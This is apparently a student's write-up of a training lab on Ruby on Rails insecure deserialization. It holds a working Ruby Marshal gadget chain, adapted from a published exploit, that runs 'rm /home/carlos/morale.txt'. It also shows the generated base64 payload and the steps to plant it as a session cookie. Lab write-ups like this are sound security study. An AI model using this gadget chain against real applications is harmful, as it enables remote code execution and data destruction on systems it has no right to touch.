*This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.
You can log in to your own account using the following credentials: wiener:peter*

Noticed following issue from the scan:
![Screenshot 2024-05-31 at 3.12.11 PM](images/Screenshot%202024-05-31%20at%203.12.11%20PM.png)

Found a script from https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html (the final code) and modified to such:
```ruby 
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer
require "base64"

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```
I made a few changes:
1. added the module `base64`
2. removed the second argument in each of the `Net::WriteAdapter.new()`
3. changed the `id` to `rm /home/carlos/morale.txt`
4. deleted the last 2 lines and added the line `puts Base63/encode64(payload)`
Ran the script and received the following output:'
```console
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBjoMQHdyaXRlcm86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBjsPbQtLZXJuZWw6DUBnaXRfc2V0
SSIfcm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQGOwxU
```
Removed the `\n` and `\r` with the following command:
```console
┌──(roshan㉿roshan)-[~/Courses/bscp/insecure_deserialization]
└─$ echo "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06        
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBjoMQHdyaXRlcm86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBjsPbQtLZXJuZWw6DUBnaXRfc2V0
SSIfcm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQGOwxU" | tr -d "\n\r"
```
This was the output:
```console 
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBjoMQHdyaXRlcm86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBjsPbQtLZXJuZWw6DUBnaXRfc2V0SSIfcm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQGOwxU                   
```
URL encoded it, replaced the cookie in the login request and issued the request to solve the lab. 
